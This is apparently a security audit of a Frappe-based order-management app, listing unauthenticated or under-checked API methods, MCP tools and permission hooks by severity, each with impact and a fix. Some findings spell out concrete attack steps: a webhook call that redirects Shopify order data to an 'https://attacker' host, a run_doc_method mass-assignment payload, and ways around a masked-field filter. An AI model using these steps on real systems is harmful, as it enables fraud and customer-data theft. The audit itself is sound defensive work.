# lh: authorization audit of non-guest whitelisted methods, MCP and permission hooks

Scope: lh/api.py, lh/utils.py, lh/mcp.py, and lh/lyfe_hardware/** except page/ (doctype, doc_events, shipping, report, forecasting, mcp_tools, integrations, validation, utils, cogs_benchmark, founder_briefing, print_format, oneclick_posting). Also the permission hooks in hooks.py:206-225. Method: read and grep only. Nothing was executed. All paths below are relative to `apps/lh/lh/`.

Framework facts the findings rely on (checked in this bench's frappe source):
- Any logged-in user can call a module-level `@frappe.whitelist()` function. Frappe adds no permission check.
- `frappe.get_doc()`, `frappe.db.*` and `frappe.get_all()` do not check permissions. `get_all` forces `ignore_permissions=True` (frappe/__init__.py:2062), even when the caller passes `ignore_permissions=False`.
- `run_doc_method` (frappe/handler.py:317-340) checks only **read** permission. With the `docs=` argument it builds the document from **client-supplied JSON** (`frappe.get_doc(parse_json(docs))`) before running the controller method.
- `permission_query_conditions` filter only list queries (`get_list` / list views / reportview). Single-document reads go only through `has_permission` hooks.
- Lyfe Order read roles (lyfe_order.json): System Manager, Customer Service, Factory, **Shipping Forwarder** (an external party), Engineer.

`lh/utils.py` has no whitelisted functions. `lh/mcp.py` exposes only `handle_mcp`, which is the frappe_mcp dispatcher.

---

## CRITICAL

### C1. Forged ShipStation import creates Lyfe Orders, customers and addresses
- `lyfe_hardware/doctype/shipstation_orders/shipstation_orders.py:944` `lh.lyfe_hardware.doctype.shipstation_orders.shipstation_orders.process_shipstation_response`
- **What a low-privilege user can do:** POST any `{"orders":[...]}` JSON. The function creates or updates ShipStation Orders and their Lyfe Orders, and with `create_customer` / `create_addresses` it also creates Customer, Address and Dynamic Link records. Every write uses `ignore_permissions` (lines 544, 596, 602, 690, 890, 923, 936). A new Lyfe Order's `after_insert` then starts routing and 1Click fulfilment. The caller can inject fake orders that get shipped, or rewrite items and addresses on existing early-status orders.
- **Evidence:** `@frappe.whitelist()` and then `data = frappe.parse_json(shipstation_json)` / `orders = data.get("orders")`. The function has no role or permission check.
- **Fix:** Remove `@frappe.whitelist()`. It is only called internally (shipstation_settings.py:556, 1053, 1615). If a manual import is needed, wrap it in a separate endpoint guarded by `frappe.only_for("System Manager")`.

### C2. Fake Shopify / bank-transfer payments mark a Quotation as Won and complete the Shopify draft order
- `lyfe_hardware/integrations/shopify.py:599` `...integrations.shopify.add_payment_entry`
- `lyfe_hardware/integrations/shopify.py:734` `...integrations.shopify.complete_draft_order`
- **What a low-privilege user can do:** Call `complete_draft_order(quotation_name=X, received_amount=<grand_total>)`. This appends a payment row (`save(ignore_permissions=True)`), sets `workflow_state="Won"` through `frappe.db.set_value` and commits. With `confirm_in_shopify=1` (the default) it also completes the Shopify draft order. The result is an order released for production and shipping with no money received. `add_payment_entry` alone can also inflate `custom_total_received_amount`.
- **Evidence:** Neither function checks permission or role. The `_check` matches in grep are calls to `_check_single_draft_order`, not permission checks.
- **Fix:** Require a role, e.g. `frappe.only_for(["Customer Service","Accounts User","System Manager"])`, plus `frappe.has_permission("Quotation","write",quotation_name,throw=True)`. Make `add_payment_entry` a private helper (`_add_payment_entry`) that is not whitelisted.

### C3. Any user can register or delete the store's Shopify webhooks
- `lyfe_hardware/integrations/shopify.py:240` `...shopify.register_shopify_webhooks(site_url=None)`
- `lyfe_hardware/integrations/shopify.py:298` `...shopify.deregister_shopify_webhooks`
- **What a low-privilege user can do:** Call `register_shopify_webhooks(site_url="https://attacker")`. The store's admin token then subscribes `orders/create`, `orders/paid` and `refunds/create` to the attacker's host, so Shopify pushes full order payloads (customer names, addresses, emails, payment data) to the attacker. Calling `deregister_shopify_webhooks` silently stops payment detection.
- **Evidence:** `site_url = (site_url or frappe.utils.get_url()).rstrip("/")` followed by `requests.post(... webhooks.json ...)`. There is no permission check.
- **Fix:** `frappe.only_for("System Manager")`. Ignore the caller's `site_url` outside developer mode.

### C4. Paid carrier (CJ / FedEx) labels with a consignee chosen by the caller
- `lyfe_hardware/shipping/cj_api.py:558` `...shipping.cj_api.generate_cj_label(order_name, payload_json)`
- `lyfe_hardware/shipping/cj_api_reshipment.py:142` `...shipping.cj_api_reshipment.generate_cj_label_for_reshipment`
- `lyfe_hardware/shipping/cj_api.py:435` `...shipping.cj_api.retry_from_integration_log(log_name)`
- **What a low-privilege user can do:** Create real, billable shipments on the company's CJ account. The live credentials are injected from CJ Settings and the consignee, parcels and items come from `payload_json`. The returned label is saved onto the order. `retry_from_integration_log` re-sends any stored CJ request with live credentials, which duplicates shipments.
- **Evidence:** `order = frappe.get_doc("Lyfe Order", order_name)`, then `payload = json.loads(payload_json)`, then `requests.post(...)`. There is no permission check (the `_check` hits are `total_weight_check`).
- **Fix:** Require `has_permission("Lyfe Order"/"Lyfe Order Reshipment","write",name,throw=True)` and a shipping role. Build the consignee on the server from the order instead of trusting the client. Restrict retry to System Manager.

---

## HIGH

### H1. External side effects (1Click / ShipStation / Shopify / email / ERP accounting) with no authorization
All of these are module-level whitelisted functions with no permission or role check.

| file:line | method | effect |
|---|---|---|
| doctype/lyfe_order/lyfe_order.py:7784 | `lyfe_order.create_load_for_order` | Re-posts a saved 1Click payload (Create Load), `doc.save(ignore_permissions=True)`, then `after_order_posted` |
| integrations/oneclick_api.py:537 | `oneclick_api.retry_create_order_from_log` | Re-fires a 1Click Create Order from an Integration Request, which duplicates fulfilment |
| doctype/shipstation_settings/shipstation_settings.py:1633 | `shipstation_settings.mark_order_as_shipped` | Marks the order shipped in ShipStation with a tracking number and carrier chosen by the caller. `notifySalesChannel: True` pushes the fulfilment to Shopify |
| integrations/shopify.py:522 | `shopify.create_draft_order` | Creates a Shopify draft order and payment link for any quotation |
| doc_events/quotation.py:1885 | `quotation.send_quotation_email` | Emails any quotation (PDF) to its customer and resets `custom_tracking_token`, which breaks earlier pay/track links |
| doctype/lyfe_order/lyfe_order.py:8270 | `lyfe_order.create_purchase_order_for_order` | `_create_po_for_order` inserts **and submits** a Purchase Order with ignore_permissions (tasks/auto_purchase_order.py:175-191) |
| doctype/lyfe_order/create_sales_invoice.py:6 | `create_sales_invoice.create_from_lyfe_order` | Inserts a Sales Invoice with `ignore_permissions=True, ignore_mandatory=True` (line 160) |
| doctype/bulk_transfer_batch/bulk_transfer_batch.py:714 | `bulk_transfer_batch.send_batch_inbound_email` | Force-resends the inbound email to 1Click support |

- **Fix:** Add `frappe.has_permission(<doctype>, "write", name, throw=True)` at the top of each, plus a role gate where the UI already limits the action (CS / System Manager). Use the `_require_customer_service()` pattern from lyfe_order.py:3180.

### H2. Lyfe Order state tampering and workflow bypass with no permission check
| file:line | method | effect |
|---|---|---|
| lyfe_order.py:3088 | `revert_workflow_state` | Moves any order back to `last_status` and clears date stamps via db.set_value |
| lyfe_order.py:3126 | `save_dispatch_again` | Clears tracking number, carrier, delivered date and tracking milestones. `save(ignore_permissions=True)` |
| lyfe_order.py:3316 | `bulk_assign_to_factory(order_names, user)` | Moves New orders to Factory Assignment (save with ignore_permissions) and assigns them to **any user** |
| lyfe_order.py:3308 / 3377 | `create_gate_pass` / `bulk_create_gate_pass` | Calls `create_gate_pass_if_not_exists`, which inserts and saves a Gate Pass with ignore_permissions |
| lyfe_order.py:4114 | `split_order(order_name, splits)` | Creates N child orders with caller-chosen warehouses and items, and changes the parent |
| lyfe_order.py:5083 | `ensure_factory_to_us_transfer_and_leg` | Inserts a Transfer Order with ignore_permissions and forces status "Received" |
| lyfe_order.py:6811 | `maybe_reroute_after_shipstation_sync` | Re-runs routing, re-enqueues 1Click fulfilment and inserts records with ignore_permissions |
| lyfe_order/tracking.py:14, order_tracking_service.py:146 | `track_order` / `track_order_validate(update_fields=1)` | Sets status=Shipped, tracking_number, carrier and shipping_label from the caller's JSON, then `save(ignore_permissions=True)`. Only a carrier-validity check is applied |
| merge_order.py:90 | `detect_merge_candidates` | Inserts Merge Suggestions (Low on its own) |

- **Fix:** At the top of each, add `frappe.has_permission("Lyfe Order","write",doc=name,throw=True)`. For bulk functions, check every name. That call also runs the Lyfe Order `has_permission` visibility hook. Remove `ignore_permissions=True` wherever the caller is a human user.

### H3. Engineering approval and drawing controls can be bypassed
- `doc_events/senior_review.py:150` `senior_review.submit_senior_review`: any user completes any Senior Review Log with outcome "Approved as-is", using `log.save(ignore_permissions=True)`. `on_update` then sends the Quotation back to Engineer Check as approved. This defeats the segregation-of-duties control.
- `doc_events/senior_review.py:32` `request_senior_review`: any user moves a quotation into Senior Review Pending and creates logs and ToDos (Medium).
- `doc_events/quotation.py:627` `cancel_drawing_upload`: clears `custom_order_drawing` on any quotation.
- `doc_events/quotation.py:652` `mark_drawing_change_pending`: sets the pending flag. The 15-minute grace sweep then **reverts the drawing upload**, giving delayed deletion.
- `doc_events/quotation.py:584` `submit_drawing_change_details`: overwrites `drawing_change_details` and adds a Comment.
- **Fix:** For submit_senior_review, require that the caller is `log.assigned_to` or holds Senior Engineer / System Manager. For the others, `frappe.has_permission("Quotation","write",quotation,throw=True)`.

### H4. COGS and financial data leak
- `doctype/lyfe_order/lyfe_order.py:8102` `lyfe_order.export_cogs_by_internal_id_range`: returns an XLSX of `cost_of_goods` for every order with a given prefix. `cost_of_goods` is permlevel-restricted, but `frappe.get_all` ignores permissions even with `ignore_permissions=False` passed, so any user gets COGS for every order.
- `lyfe_order.py:8189` `get_payment_stage_summary` (Medium): returns quotation payment schedule and amount received for any order, with no check.
- **Fix:** Use `frappe.get_list` (which strips permlevel fields) and check that the caller has permlevel access to `cost_of_goods`, or gate with `require_roles(COGS_ROLES)`.

### H5. Master data creation and overwrite (Items, BOMs) with ignore_permissions
- `utils/bom_from_drawing.py:160` `bom_from_drawing.confirm_bom_from_drawing(order_name, confirmed_tables_json)`: creates Item masters (lines 265, 310) and creates or **overwrites** Lyfe BOMs (lines 392, 394), all with ignore_permissions, from caller JSON. (The `_require`/`_ensure` grep hits are helper names, not permission checks.)
- `doctype/material_issue_for_order/material_issue_for_order.py:767 / 849 / 985` `resolve_or_create_finish_item / _tube_item / _acrylic_item` (Medium): insert Items with ignore_permissions and commit.
- `shipping/bom_box_calculator.py:276` `bulk_save_box_dims(items_json)` (Medium): `db.set_value` on any `Custom BOM Items` row named by the caller.
- **Fix:** Require `has_permission("Item","create")` / `("Lyfe BOM","write")` and remove ignore_permissions.

### H6. Mass assignment through `run_doc_method(docs=...)` on Lyfe Order controller methods
- `lyfe_order.py:382` `LyfeOrder.backfill_erp_items_from_item_name`: `self.save(ignore_permissions=True)`
- `lyfe_order.py:2973` `LyfeOrder.fetch_shopify_details`: `self.save(ignore_permissions=True)`
- `lyfe_order.py:418` `LyfeOrder.create_gate_pass_if_not_exists`: Gate Pass insert with ignore_permissions
- **What a low-privilege user can do:** Any user with Lyfe Order **read** (including the external Shipping Forwarder role, and Factory) can call `run_doc_method` with `docs={"doctype":"Lyfe Order","name":"<real>","modified":"<current>", ...any fields...}`. Frappe builds the document from that JSON and checks only read. The method then saves it with `ignore_permissions=True`, which persists every attacker-chosen field, including permlevel-protected ones (cost_of_goods, customer, status/workflow_state, warehouse). The `has_permission` hook (`can_see_order`) reads `doc.warehouse` and `doc.status` from this in-memory, attacker-built document. A role-limited user can set `warehouse="Factory - LH"` to pass the visibility check on an order they should not see.
- **Fix:** Inside each of these methods, call `self.check_permission("write")`. Reload from the database (`doc = frappe.get_doc(self.doctype, self.name)`) before saving, and avoid `ignore_permissions=True`. Make `can_see_order` read warehouse and status from the database, as the Senior Engineer branch already does.

### H7. Order PII export and pick-pack generation for arbitrary orders
- `report/order_export_utils.py:647` `order_export_utils.prepare_pdf(order_names, attach_doctype, attach_docname, is_private=1, ...)`
- `report/lyfe_orders_status_overview_report/lyfe_orders_status_overview_report.py:2406` `prepare_pdf` (same pattern, `save_file` at line ~2699)
- `.../lyfe_orders_status_overview_report.py:581` and `report/order_analysis_dashbord/order_analysis_dashbord.py:256` `export_orders(...)`
- `doctype/lyfe_order/pick_pack.py:197` `pick_pack.generate_pick_pack_pdf` (Medium)
- **What a low-privilege user can do:** Render any orders (customer name, address, items, photos) to PDF or Excel. `is_private=0` creates a **public** `/files/` URL that needs no login. The file can be attached to any doctype and docname the caller chooses. None of this goes through the Lyfe Order visibility hooks.
- **Evidence:** `lo_doc = frappe.get_doc("Lyfe Order", order_name)` and `save_file(..., dt=attach_doctype, dn=attach_docname, is_private=int(is_private))`.
- **Fix:** Check read permission on each order with `has_permission`. Force `is_private=1`. Allow only `attach_doctype` values in an allowlist, and require write on the attach target.

---

## MEDIUM

### M1. MCP masked-field filter and sort guard can be bypassed (value inference)
- `lyfe_hardware/mcp_tools/doctypes.py:312-349` `_referenced_fieldnames`, used by `_require_no_masked_filter_or_sort` (line 351), by every `list_<doctype>` tool, and by `generic_list.list_any_doctype` (generic_list.py:119).
- **Bypasses:**
  - (a) `filters` passed as a **JSON string**. Neither the dict nor the list branch matches, so no fieldnames are collected, and Frappe's DatabaseQuery then `json.loads` it (db_query.py:650). The fork's schema says `dict`, but the dispatcher does not validate the schema (the lh code says so itself).
  - (b) The 4-element filter form `["Lyfe Order","cost_of_goods",">",100]`. `item[0]` is the doctype, not the fieldname.
  - (c) `order_by="`tabLyfe Order`.cost_of_goods desc"`. The token does not equal `cost_of_goods`.
  - (d) Child-table masked fields (`_masked_child_fieldnames`) are never checked on the filter path.
  - The result: a non-Super-Admin MCP user can binary-search permlevel-masked values such as COGS or customer.
- **Fix:** Normalise filters the way Frappe does: parse strings, and for list items take `item[1]` when `len(item)==4`. Strip backticks and table prefixes from order_by. Include child masks. Simplest option: reject any filter or order_by that is not a dict with plain fieldnames.

### M2. MCP Status Overview tools have no role or doctype gate
- `mcp_tools/status_overview.py:42-93` `get_orders_status_overview`, `get_orders_reshipments`, `get_active_reshipments`, `get_active_returns`. These are the only hand-written MCP tools without `require_dashboard_role` / `require_*`. The backend (page/lyfe_orders_status_overview.py:198, 638, 741, 809) runs raw `frappe.db.sql` with no read-permission or visibility check. Only permlevel field stripping is applied.
- **What a low-privilege user can do:** Any enabled user with an MCP token, including an Employee-only HR user with no Lyfe Order access, gets every order, reshipment and return row.
- **Fix:** Add `require_dashboard_role("order_analysis")`, or `frappe.has_permission("Lyfe Order","read",throw=True)`, plus `apply_visibility_conditions` in the backend.
- **Note:** Per-user enforcement elsewhere in MCP is real. Generated get/list tools call `frappe.has_permission` and `get_list`. Dashboard tools call role gates. `list_any_doctype` and `search_records` use `get_list`. The design claim holds apart from M1 and M2 and the hook gaps in M3 and M4.

### M3. Row-level restrictions apply to lists only. Single-document reads bypass them.
- hooks.py:206-225 registers `permission_query_conditions` for CRM Lead, CRM Deal, Quotation, Project and Task, but **no matching `has_permission`**. The hooks.py comment says the restrictions "mirror ... block direct form/API access", but that is true only for Lyfe Order.
- **What a low-privilege user can do:**
  - A Sales User can open any CRM Lead or Deal by name (`/api/resource/CRM Lead/<name>`, or the form).
  - A Senior Engineer can read any Quotation.
  - A non-member can read any Project or Task. MCP `get_project`, `get_task` and `get_quotation` also allow this, because `frappe.has_permission(doc=...)` has no hook to apply.
  - Names are sequential and easy to enumerate.
- `lh_project/permissions.py:91` docstring says the condition restricts "frappe.get_all('Project')". That is wrong: get_all ignores permissions.
- **Fix:** Add `has_permission` hooks that apply the same predicate (`has_project_access`; the assignment check for CRM and Quotation).

### M4. `_assign LIKE '%user%'` matches substrings and LIKE wildcards
- `doc_events/crm_lead.py:14`, `doc_events/crm_deal.py:14`, `doc_events/quotation.py:1842`. The value is SQL-escaped (no injection), but `%`/`_` are not LIKE-escaped and the match is a substring. User `a@lyfe.com` matches leads assigned to `maria@lyfe.com`, and `_` in an email matches any character.
- **Fix:** Match the JSON-quoted token, `LIKE {escape('%"' + user + '"%')}`, after escaping `%` and `_`. Or join `tabToDo` (`allocated_to = user, status='Open'`).

### M5. External Learning Record has `has_permission` but no `permission_query_conditions`
- hooks.py:223 → `lh_hrms/doctype/external_learning_record/external_learning_record.py:136`. The document hook denies non-owners, but list queries (list view, report view, `get_list`, and MCP `list_external_learning_record` / `list_any_doctype`) do not run `has_permission`. Any employee with doctype read can list every employee's records.
- **Fix:** Add a matching query condition (owner = user OR employee.reports_to = the user's employee OR HR role).

### M6. Arbitrary workflow state with write permission only
- `lyfe_order.py:3434` `change_status(order_name, target_status)` sets `workflow_state` to any value and saves with ignore_permissions. Any write user (Factory, Shipping Forwarder) can jump an order to Approved or Completed and skip engineer checks.
- `lyfe_order.py:3505` `skip_factory_images` behaves the same way (fixed target state).
- **Fix:** Validate against the allowed transitions (`frappe.model.workflow.get_transitions`) or call `apply_workflow`.

### M7. Ungated direct endpoints behind gated MCP tools
- `forecasting/exponential_smoothing.py:149, 207, 262` `get_*_demand_forecast_api`; `founder_briefing/data.py:256` `get_stuck_orders_api`; `doc_events/senior_review_dashboard.py:16, 43, 67, 103` (per-engineer performance stats).
- The MCP wrappers enforce `require_founder_ai_or_super_admin`, but `/api/method/...` on these functions has no gate, so any user gets sales-velocity, forecast and stuck-order data.
- **Fix:** Call the same `require_*` helper inside each `_api` function, as `get_projected_stockouts_api` (data.py:896) already does.

### M8. Arbitrary S3 object read (images)
- `print_format/zoho_purchase_order/zoho_purchase_order.py:8` `get_s3_image_url(image_path)`. It presigns **any** key taken from `key=` and returns a 128px base64 thumbnail. Any user can view private image attachments (ID scans, signatures, HR documents) whose key they know or can see in a File URL.
- **Fix:** Look up the `File` by key, call `frappe.has_permission("File","read",file_doc,throw=True)`, then fetch.

### M9. Write helpers without permission checks (data integrity)
- `lyfe_order.py:3162` `add_return_timeline_comment(order_name, message)` inserts a Comment with raw caller HTML on any order (ignore_permissions). This allows forged audit trails and depends on Frappe's HTML sanitiser.
- `material_issue_for_order.py:426` `add_item_by_barcode` (MIFO `save(ignore_permissions=True)`).
- `gate_pass/gate_pass.py:630` `create_bulk_transfer_batch_for_multi_order_boxes` (insert with ignore_permissions).
- `packing_list/packing_list.py:18` `create_packing_list` (insert with ignore_permissions).
- `shipping/box_catalogue_sync.py:75` `sync_from_all_gate_passes` (rewrites the box catalogue).
- `material_issue_for_order.py:636` `create_material_receipt_for_row`: inserts a zero-valuation Material Receipt with ignore_permissions. `submit()` still checks submit permission, so the impact is limited to Stock Entry submitters, who can create stock in any rack with no MIFO link.
- **Fix:** `has_permission(..., "write", throw=True)`. Remove ignore_permissions.

### M10. Paid-API and quota abuse
- `validation/engine.py:158` `rerun_validation` enqueues a Claude (Anthropic) call per call, for any order and any user, with no dedupe (`job_id` without `deduplicate=True`).
- `report/shipment_analysis_dashboard/shipment_analysis_dashboard.py:191` `start_real_time_tracking_job` starts a full 17track sweep.
- `api.py:204` `sync_customer` starts a 30-minute ShipStation customer sync.
- `doctype/lyfe_order/lyfe_order.py:7117` `check_bom_us_stock` calls the 1Click inventory API.
- **Fix:** Role gate (CS / System Manager), plus `deduplicate=True` on the enqueue calls.

### M11. Customer PII read with no check
- `shipping/cj_api.py:124` `get_cj_prefill_data` and `cj_api_reshipment.py:94` return the real consignee name, phone, email and address. This bypasses the display masking in `get_display_consignee_contact`.
- `merge_order.py:902` `get_suggestion_details` returns customer and customer_email for orders in any suggestion.
- `material_issue_for_order.py:494` `get_items_from_lyfe_order`.
- **Fix:** `has_permission("Lyfe Order","read",doc=...,throw=True)` and reuse `get_masked_contact`.

---

## LOW

- **L1. Information leaks (names and counts) with no check.**
  - lyfe_order.py:3293 `get_gate_pass_for_order` (get_all with ignore_permissions), 5167 `get_order_legs_html`, 5302 `is_inventory_check_error`, 8246 `get_mifo_count`, 8525 `get_merge_source_orders`.
  - quotation.py:1864 `get_linked_lyfe_orders` (ignore_permissions by design).
  - senior_review_routing.py:101, 127, 157.
  - validation/engine.py:146 `get_validation_result`.
  - lyfe_export_document.py:134 `get_item`.
  - material_issue_for_order.py:354, 401 (raw SQL order pickers, no visibility), 614.
  - order_visibility_settings.py:214 `get_role_visible_statuses`.
  - shipping calculators (shipping_calculator.py:24, contract_rate_calculator.py:51/279/410, bom_box_calculator.py:18/78/85/221, rates APIs).
  - Fix: add read checks where the data is order-specific.
- **L2. Order Visibility engine logic** (`doctype/order_visibility_settings/order_visibility_settings.py`).
  - (a) It defaults to allow: any role not in CS, Factory or `role_states` gets no row filter and `can_see_order` returns True (line ~211). This is documented, but adding a new low-privilege role with Lyfe Order read exposes every order.
  - (b) A user holding two roles that both appear in `role_states` gets whichever role a Python `set` iterates first. This can differ between workers (hash randomisation) and between the list and document paths.
  - (c) `can_see_order` trusts in-memory `doc.warehouse` / `doc.status` (see H6).
  - (d) `_is_cs_team` gives full visibility to anyone with the Engineer role.
  - Fix: default-deny for roles that have no rule, a deterministic merge (union of statuses), and a database read of warehouse and status.
- **L3.** `merge_order.py:819` `merge_orders_from_list` inserts and **commits** a Merge Suggestion (ignore_permissions) before `confirm_merge` runs `_check_merge_permission`. A non-CS caller leaves junk suggestions behind. Fix: check the role first.
- **L4.** `timesheet_timer.py:129` `start_revision` reads any Timesheet with `get_doc` and no check. `create_and_start_timer` takes an arbitrary `employee`, but the insert is permission-checked. Low.
- **L5.** Controller methods that need only **read** but write (internal roles only): `us_warehouse_replenishment.py:22/119/195` (creates and submits Stock Entries with ignore_permissions), `transfer_order.py:30/86`, `lyfe_order_reshipment.py:352`, `lyfe_order.py:2106`, and `shipstation_settings.py:311/334/722` (System Manager read only). Add `self.check_permission("write")` to the writing methods.
- **L6. `mcp_scope_guard.py`.** The logic is sound: an exact path match, the client ID read from `OAuth Bearer Token` by token, so it does not depend on auth order.
  - (a) It fails open for any OAuth client not listed in `MCP_OAUTH_CLIENT_IDS`. A third MCP client issued later is not route-bound until someone edits the code. Consider binding by a flag on the OAuth Client.
  - (b) It runs as a `before_request` hook, before `validate_auth`, so it also runs for invalid tokens. That is harmless.
  - (c) MCP tools are only "read-only per-user" if no tool ever calls a whitelisted function that writes. Today the dashboard tools `frappe.call` read-only backends. Keep it that way.
- **L7 (out of listed scope, noted).** `overrides/s3_override.py:68` `custom_file_upload_to_s3(doc, method)` is a doc-event handler marked `@frappe.whitelist()`. It is not exploitable as-is, because `doc` arrives as a str or dict and attribute access fails. If ever reachable with an object, it would upload and `os.remove` paths derived from `file_url`. Remove the decorator.

---

## Methods reviewed with adequate guards (no finding)
- **Has an explicit permission or role check:**
  - lyfe_order.py: 3409 `set_on_hold`, 3456 `get_qc_summary`, 3478 `request_contact_info` (Factory role), 3189 `update_order_note` (CS), 4427 `revert_split`, 4452 `revert_splits_bulk`, 4552 `create_customer_for_manual_order`, 4687/4720 (CS), 5314, 5350, 5442, 5498, 5629, 5719, 6025, 6113, 6581, 8313.
  - oneclick_posting.py:552.
  - merge_order.py:327/544/606 (CS/SM), 691/717 (these call confirm_merge, or read only).
  - lyfe_order_reshipment.py:575; reshipment tracking.py:434; reshipment oneclick.py:62/334.
  - lyfe_order_return.py:528; gate_pass.py:598; lyfe_po.py:67/86.
  - bulk_transfer_batch.py:728; sales_invoice.py:197; lyfe_order_qc_item.py:155.
  - cogs_benchmark/checker.py:468; backtest.py:245; founder_briefing/data.py:896; shopify_token_rotation.py:96.
  - drawing_upload.py:34.
  - MCP `receivables.get_unpaid_orders` / `stock.get_stock_level` (also directly whitelisted, gated by `require_founder_ai_or_super_admin`).
- **Writes through permission-checked `doc.save()` / `insert()`:** timesheet_timer (start/next/pause/resume/stop), shipping_calculator.py:237 `apply_shipping_rate`, bulk_transfer_batch.py:468/548/569.
